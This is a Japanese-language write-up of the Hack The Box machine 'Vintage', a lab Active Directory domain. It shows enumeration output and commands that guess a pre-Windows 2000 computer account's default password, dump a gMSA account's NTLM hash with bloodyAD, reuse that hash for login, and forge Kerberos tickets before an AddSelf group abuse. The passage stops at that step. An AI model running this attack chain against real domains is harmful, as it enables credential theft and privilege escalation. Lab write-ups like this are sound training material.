![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/Vintage
- #hard 
- OS : #Windows
- Machine Author(s): 
- Hack Date: 2025-09-01,11:01
# Machine Information
As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

ドメイン
- vintage.htb0.Site

| **ポート**   | **サービス**     | **バージョン**                                                      | **その他**                                            |
| --------- | ------------ | -------------------------------------------------------------- | -------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                                                |                                                    |
| 88/tcp    | **Kerberos** | Microsoft Windows Kerberos (server time: 2025-09-01 02:09:42Z) |                                                    |
| 135/tcp   | msrpc        | Microsoft Windows RPC                                          |                                                    |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn                                  |                                                    |
| 389/tcp   | **LDAP**     | Microsoft Windows Active Directory LDAP                        | Domain: vintage.htb0.Site: Default-First-Site-Name |
| 445/tcp   | **SMB**      | ?                                                              |                                                    |
| 464/tcp   | kpasswd5     | ?                                                              |                                                    |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                            |                                                    |
| 636/tcp   | **LDAPS**    |                                                                |                                                    |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP                        | Domain: vintage.htb0.Site: Default-First-Site-Name |
| 3269/tcp  | tcpwrapped   |                                                                |                                                    |
| 5985/tcp  | **WinRM**    | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                        | Server: Microsoft-HTTPAPI/2.0Title: Not Found      |
| 9389/tcp  | **ADWS**     | .NET Message Framing                                           |                                                    |
| 49664/tcp | msrpc        | Microsoft Windows RPC                                          |                                                    |
| 49668/tcp | msrpc        | Microsoft Windows RPC                                          |                                                    |
| 49676/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                            |                                                    |
| 49687/tcp | msrpc        | Microsoft Windows RPC                                          |                                                    |
| 57783/tcp | msrpc        | Microsoft Windows RPC                                          |                                                    |
| 61659/tcp | msrpc        | Microsoft Windows RPC                                          |                                                    |
  

## nmap
DCであることがわかる
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-01 02:09:42Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57783/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61659/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/31%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68B500C5%P=aarch64-unknown-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=A)
SEQ(SP=105%GCD=1%ISR=107%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

```

やること
まず、今のユーザーが何の権限を持っているのかをみる
- LDAP
横展開出来得るのかを調べる
- BloodHound
SMBの匿名、現状のユーザーでログインできるのかを確認する

## LDAP
正しいドメイン名を確認
- `DC=vintage,DC=htb`とわかる
```sh
└─$ ldapsearch -x -H ldap://10.129.231.205 \
  -s base -b "" \
  "(objectClass=*)" defaultNamingContext rootDomainNamingContext namingContexts
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: defaultNamingContext rootDomainNamingContext namingContexts 
#

#
dn:
namingContexts: DC=vintage,DC=htb
namingContexts: CN=Configuration,DC=vintage,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=vintage,DC=htb
namingContexts: DC=DomainDnsZones,DC=vintage,DC=htb
namingContexts: DC=ForestDnsZones,DC=vintage,DC=htb
rootDomainNamingContext: DC=vintage,DC=htb
defaultNamingContext: DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

P.Rosa自身の情報を確認
- primaryGroupID: 513(Domain Users)
	- 特に特別なもの(権限など)はなさそう
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ ldapsearch -x -H ldap://10.129.231.205 -D "P.Rosa@vintage.htb" -w 'Rosaisbest123' -b "DC=vintage,DC=htb" "(sAMAccountName=P.Rosa)"
# extended LDIF
#
# LDAPv3
# base <DC=vintage,DC=htb> with scope subtree
# filter: (sAMAccountName=P.Rosa)
# requesting: ALL
#

# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: P.Rosa
distinguishedName: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605133108.0Z
whenChanged: 20250901022330.0Z
uSNCreated: 12933
uSNChanged: 118894
name: P.Rosa
objectGUID:: uEHT9l86WUeWmB0wl0fj9w==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133622224837626680
lastLogoff: 0
lastLogon: 133753698059561459
pwdLastSet: 133753696369681688
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6XAQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: P.Rosa
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241106122627.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 134011670104074394
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```


## BloodHound
- これで、他のユーザーなどの権限を見る
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ sudo bloodhound-python -u 'P.Rosa@vintage.htb' -p 'Rosaisbest123' -ns 10.129.231.205 -d vintage.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.128 seconds: Server Do53:10.129.231.205@53 answered The DNS operation timed out.
INFO: Done in 00M 40S

```

- 特に、Kerberoasting攻撃できるユーザーは居なそう
- AS-REP Roastingできるユーザーもいない
- 特にP.Rosaから簡単に横展開できそうなユーザーはいない

どうするか
- SMB、匿名ログイン有効になってないか確認
- ldapsearchで、パスワードとか書いてるユーザーとかいないかな

## SMB
### 問題

なぜか、`NT_STATUS_NOT_SUPPORTED`というエラーメッセージが表示される
- 匿名ログインが不可の時は、`NT_STATUS_ACCESS_DENIED`や、`NT_STATUS_LOGON_FAILURE`と表示される記憶
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ smbclient -N -L //$Target_IP
session setup failed: NT_STATUS_NOT_SUPPORTED
```

匿名ログインやSMBのバージョンの違いかと思ったが違いそう
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ smbclient -L //10.129.231.205 -U 'P.Rosa'%'Rosaisbest123'
session setup failed: NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ smbclient -L //10.129.231.205 -U 'P.Rosa' --option='client min protocol=NT1'
session setup failed: NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ smbclient -L //10.129.231.205 -U 'P.Rosa' --option='client min protocol=SMB2' --option='client max protocol=SMB3'
session setup failed: NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ smbclient -L //10.129.231.205 -U 'P.Rosa' --option='client use spnego = no'
lpcfg_do_global_parameter: WARNING: The "client use spnego " option is deprecated
lpcfg_do_global_parameter: WARNING: The "client use spnego " option is deprecated
session setup failed: NT_STATUS_NOT_SUPPORTED
```

### 解決
-  NTLMでの認証がそもそも許可されていないかもしれない
→ Kerberos チケットを使った認証を行う

準備
 /etc/krb5.conf を編集
```sh
[libdefaults]
  default_realm = VINTAGE.HTB
  dns_lookup_kdc = false
  dns_lookup_realm = false

[realms]
  VINTAGE.HTB = {
    kdc = 10.129.231.205
  }
```

Kerberosチケットを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ kinit 'P.Rosa@VINTAGE.HTB'
Password for P.Rosa@VINTAGE.HTB: 
```

きちんと保存、設定絵されているのかを確認
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ klist                     
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: P.Rosa@VINTAGE.HTB

Valid starting     Expires            Service principal
09/01/25 03:07:28  09/01/25 13:07:28  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 09/02/25 03:07:18

```

SMBにkerberosチケットを使って、ログインする
 - 中身を閲覧できた
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ smbclient -L //dc01.vintage.htb -k
WARNING: The option -k|--kerberos is deprecated!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to dc01.vintage.htb failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

C$フォルダにはもちろんアクセスできない
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ smbclient //dc01.vintage.htb/C$ -k    
WARNING: The option -k|--kerberos is deprecated!
tree connect failed: NT_STATUS_ACCESS_DENIED

```

SYSVOLにアクセスして、漁った結果
- SYSVOL共有内のスクリプトにハードコードされた認証情報はなさそう
```sh
SYSVOL
└── vintage.htb
    ├── DfsrPrivate          (アクセス拒否)
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── MACHINE
    │   │   │   ├── Registry.pol
    │   │   │   └── Microsoft
    │   │   │       └── Windows NT
    │   │   │           └── SecEdit
    │   │   │               └── GptTmpl.inf
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04FB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts
```

取得したファイルの中身
- GptTmpl.infに通常は含まれないSIDが含まれている
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ cat GPT.INI                                                   
[General]
Version=3
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ cat GptTmpl.inf
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-80-592940576-1656185091-296729330-4026955537-2205062631,*S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133,*S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-80-592940576-1656185091-296729330-4026955537-2205062631,*S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-80-592940576-1656185091-296729330-4026955537-2205062631,*S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133,*S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-21-4024337825-2033394866-2055507597-1140,*S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544,*S-1-5-21-4024337825-2033394866-2055507597-1115
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
```

## ldapsearch
おま環なのかもしれないが、ldapdomaindumpが動かないので、ldapsearchで、descriptionのみを抽出したが、特にパスワードが露出しているみたいなことはなさそう
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ ldapsearch -Y GSSAPI -H ldap://dc01.vintage.htb \
  -b "DC=vintage,DC=htb" -LLL \
  "(objectClass=user)" sAMAccountName description
SASL/GSSAPI authentication started
[11025] 1756729714.975936: ccselect module realm chose cache FILE:/tmp/krb5cc_1000 with client principal P.Rosa@VINTAGE.HTB for server principal ldap/dc01.vintage.htb@VINTAGE.HTB
[11025] 1756729714.975937: Getting credentials P.Rosa@VINTAGE.HTB -> ldap/dc01.vintage.htb@ using ccache FILE:/tmp/krb5cc_1000
[11025] 1756729714.975938: Retrieving P.Rosa@VINTAGE.HTB -> krb5_ccache_conf_data/start_realm@X-CACHECONF: from FILE:/tmp/krb5cc_1000 with result: -1765328243/Matching credential not found (filename: /tmp/krb5cc_1000)
[11025] 1756729714.975939: Retrieving P.Rosa@VINTAGE.HTB -> ldap/dc01.vintage.htb@ from FILE:/tmp/krb5cc_1000 with result: -1765328243/Matching credential not found (filename: /tmp/krb5cc_1000)
[11025] 1756729714.975940: Retrying P.Rosa@VINTAGE.HTB -> ldap/dc01.vintage.htb@VINTAGE.HTB with result: -1765328243/Matching credential not found (filename: /tmp/krb5cc_1000)
[11025] 1756729714.975941: Server has referral realm; starting with ldap/dc01.vintage.htb@VINTAGE.HTB
[11025] 1756729714.975942: Retrieving P.Rosa@VINTAGE.HTB -> krbtgt/VINTAGE.HTB@VINTAGE.HTB from FILE:/tmp/krb5cc_1000 with result: 0/Success
[11025] 1756729714.975943: Starting with TGT for client realm: P.Rosa@VINTAGE.HTB -> krbtgt/VINTAGE.HTB@VINTAGE.HTB
[11025] 1756729714.975944: Requesting tickets for ldap/dc01.vintage.htb@VINTAGE.HTB, referrals on
[11025] 1756729714.975945: Generated subkey for TGS request: aes256-cts/7064
[11025] 1756729714.975946: etypes requested in TGS request: aes256-cts, aes128-cts, aes256-sha2, aes128-sha2, des3-cbc-sha1, rc4-hmac, camellia128-cts, camellia256-cts
[11025] 1756729714.975948: Encoding request body and padata into FAST request
[11025] 1756729714.975949: Sending request (1751 bytes) to VINTAGE.HTB
[11025] 1756729714.975950: Resolving hostname 10.129.231.205
[11025] 1756729714.975951: Initiating TCP connection to stream 10.129.231.205:88
[11025] 1756729715.100273: Sending TCP request to stream 10.129.231.205:88
[11025] 1756729715.100274: Received answer (1713 bytes) from stream 10.129.231.205:88
[11025] 1756729715.100275: Terminating TCP connection to stream 10.129.231.205:88
[11025] 1756729715.100276: Response was not from primary KDC
[11025] 1756729715.100277: Decoding FAST response
[11025] 1756729715.100278: FAST reply key: aes256-cts/184D
[11025] 1756729715.100279: TGS reply is for P.Rosa@VINTAGE.HTB -> ldap/dc01.vintage.htb@VINTAGE.HTB with session key aes256-cts/21F4
[11025] 1756729715.100280: TGS request result: 0/Success
[11025] 1756729715.100281: Received creds for desired service ldap/dc01.vintage.htb@VINTAGE.HTB
[11025] 1756729715.100282: Storing P.Rosa@VINTAGE.HTB -> ldap/dc01.vintage.htb@ in FILE:/tmp/krb5cc_1000
[11025] 1756729715.100283: Creating authenticator for P.Rosa@VINTAGE.HTB -> ldap/dc01.vintage.htb@, seqnum 470142075, subkey aes256-cts/66C8, session key aes256-cts/21F4
[11025] 1756729715.100285: Read AP-REP, time 1756729716.100284, subkey aes256-cts/639B, seqnum 1890371482
SASL username: P.Rosa@VINTAGE.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
description: Built-in account for administering the computer/domain
sAMAccountName: Administrator

dn: CN=Guest,CN=Users,DC=vintage,DC=htb
description: Built-in account for guest access to the computer/domain
sAMAccountName: Guest

dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
sAMAccountName: DC01$

dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
description: Key Distribution Center Service Account
sAMAccountName: krbtgt

dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: gMSA01$

dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
sAMAccountName: FS01$

dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
sAMAccountName: M.Rossi

dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
sAMAccountName: R.Verdi

dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi

dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
sAMAccountName: G.Viola

dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
sAMAccountName: C.Neri

dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
sAMAccountName: P.Rosa

dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql

dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap

dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark

dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
sAMAccountName: C.Neri_adm

dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi_adm

# refldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# refldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# refldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

```

ここで手詰まりになりました。
特に何も手掛かりを見つけることができなかったので、以下は[0xdfHackさんのWriteup](https://0xdf.gitlab.io/2025/04/26/htb-vintage.html)を参考にして行なっていきます。
# Foothold
## FS01.vintage.htb
bloodhound実行時に、以下のように２つのコンピュータがあることに着目する
```bash
└─$ sudo bloodhound-python -u 'P.Rosa@vintage.htb' -p 'Rosaisbest123' -ns 10.129.231.205 -d vintage.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
<SNIP>
INFO: Found 2 computers
```

BloodHound上で、COMPUTERSの中に、FS01.VINTAGEが見つかる

![](https://i.imgur.com/b2Eh2Ra.png)

そして、FS01.VINTAGE.HTBは、DOMAIN COMPUTERSグループとPRE-WINDOWS 2000グループに属していることがわかる
- PRE-WINDOWS 2000グループ
	- 概要
		- 古いwindows(2000以前)との互換性を維持するために存在する組み込みグループ
		- 昔のアプリや OS が LDAP / AD にアクセスする際に「誰でもユーザー属性を読めるようにする」ため
	- 脆弱な習慣
		- コンピュータアカウントの初期パスワードが「samAccountName を小文字にして $ を外した文字列」になる
		- 例: FS01$ → パスワードは fs01
		- これは「古い互換性のため」「ADUC で事前作成したけど実際のマシンと結びついてない場合」などに起こる
	- 参考文献
		- Microsoft PRE-WINDOWS 2000グループについて
			- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7a76a403-ed8d-4c39-adb7-a3255cab82c5
		- 弱いパスワードが設定されていることに言及している記事 
			- https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df

![](https://i.imgur.com/Y0O6BXe.png)

そして、FS01.VINTAGE.HTBは、DOMAIN COMPUTERSグループに属していて、GMSA01$に対して、ReadGMSAPasswordを持っている

![](https://i.imgur.com/7zWSl26.png)

それってどういうこと？
以下翻訳
- GMSA01$アカウントは、**グループ マネージド サービス アカウント（gMSA）**
- ReadGMSAPasswordが設定されてることで、DOMAIN COMPUTERSグループは、 このGMSA01$アカウントのパスワードを取得できる
- グループ マネージド サービス アカウント (gMSA) は Active Directory の特別なオブジェクトで、そのパスワードはドメインコントローラーによって管理され、一定の間隔で自動的に変更される（MSDS-ManagedPasswordInterval 属性を確認）。
- gMSA の本来の用途は、特定のコンピュータアカウントに GMSA のパスワードを取得させ、そのアカウントを使ってローカルサービスを実行できるようにすること
- しかし攻撃者が許可されたプリンシパル（認証された主体）を制御できる場合、その権限を悪用して GMSA をなりすますことが可能になる

![](https://i.imgur.com/8GnCKLP.png)

なるほど、じゃあ現状、FS01アカウントのパスワードを推測できることができ、その権限を使って、GMSAアカウントのパスワードを取得することができるってことか

BloodhoundのLinux Abuseに従って、gMSADumper.pyを使って行う
![](https://i.imgur.com/r27aj54.png)

gMSADumper.pyを試してみたが、、gMSADumper.pyは動かない
```sh
wget https://github.com/micahvandeusen/gMSADumper/raw/refs/heads/main/gMSADumper.py
```

なので、ldapsearchでgMSAの認証情報を取得する
まず、FS01.VINTAGE.HTBで、Kerberosチケットを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ kinit 'FS01$@VINTAGE.HTB'
Password for FS01$@VINTAGE.HTB: 
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: FS01$@VINTAGE.HTB

┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ klist
Valid starting     Expires            Service principal
09/01/25 06:29:43  09/01/25 16:29:43  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 09/02/25 06:29:40
```

以下の記事を参考にして、[bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python)を使用してgMSAの認証情報を取得する
- https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ bloodyAD -d vintage.htb -k ccache=/tmp/krb5cc_1000 --host "dc01.vintage.htb" get object "CN=GMSA01,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB" --attr msDS-ManagedPassword

distinguishedName: CN=GMSA01,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:6fa8a70cfb333b7f68e3f0d94b247f68
msDS-ManagedPassword.B64ENCODED: gUjHVEcHSoC4wazwe+WHdy2JNIheI+PooldGqJwVseiLqVhZlWynhwt85hXrXik/sA8NVKpWyejejqiimujN1szuLdTybUaCHdprZxTo41ahJN6n51MJcQV4mi13YHgwfGE4q4VIwvE1ERUL0MlyW0Jo/gThdgQ3xOQTx7dZjsVOrc3PqkNXVBjdAQppsHTZ4kKIRVVW1jwNbmFMCGfpcyIqCBbsNn0TpZiO4+0ZAQnZ8ZijxJ3A6J7wvka2R3IUtKG1vVWBGCQMBm4ASBmMkm1pKz9KORuniiYzkl0HI1qQrUmREbWzZvi2U0ipbXdStBfXGQXSl7v8ou7fXqz5DA==
```

NTLMハッシュが取得できた。GMSA01$としてログインできるのかを確かめる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ netexec ldap 10.129.231.205 -d vintage.htb -u 'GMSA01$' -H '6fa8a70cfb333b7f68e3f0d94b247f68' -k
LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        10.129.231.205  389    DC01             [+] vintage.htb\GMSA01$:6fa8a70cfb333b7f68e3f0d94b247f68 
```

GMSA01$としてログインできた。

### GMSA01$の認証情報
NTLMハッシュ : 6fa8a70cfb333b7f68e3f0d94b247f68


# Lateral Movement
## svc_sqlへの横展開
- BloodHoundで、GMSA01$のOutbound Object Controlを確認すると、SERVICEMANAGERグループに対するAddSelfを通して、3つのサービスアカウントに対して、GenericAllを持っていることがわかる
![](https://i.imgur.com/XRLj71r.png)


まず、SERVICEMANAGERSグループに対するAddSelfを行う

- AddSelfとは
	- その名の通り、自分自身をSERVICEMANAGERSグループに追加する権限のこと
	- 追加すると、セキュリティグループのメンバーはそのグループが持つ権限と同じ権限を持つ

この環境では、NTLMが無効化されているため、bloodyADを使用する
- 参考記事 : https://www.hackingarticles.in/addself-active-directory-abuse/

まず、**TGTを取得**する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ ktutil  
ktutil:  addent -p GMSA01$@VINTAGE.HTB -k 1 -e rc4-hmac
usage: addent (-key | -password) -p principal -k kvno [-e enctype] [-f|-s salt]
ktutil:  addent -key -p GMSA01$@VINTAGE.HTB -k 1 -e rc4-hmac
Key for GMSA01$@VINTAGE.HTB (hex): 6fa8a70cfb333b7f68e3f0d94b247f68
ktutil:  wkt /tmp/GMSA01.keytab
ktutil:  exit
```

```sh
└─$ impacket-getTGT -k -hashes :6fa8a70cfb333b7f68e3f0d94b247f68 'vintage.htb/gmsa01$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gmsa01$.ccache
```

**AddSelfを行う**
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
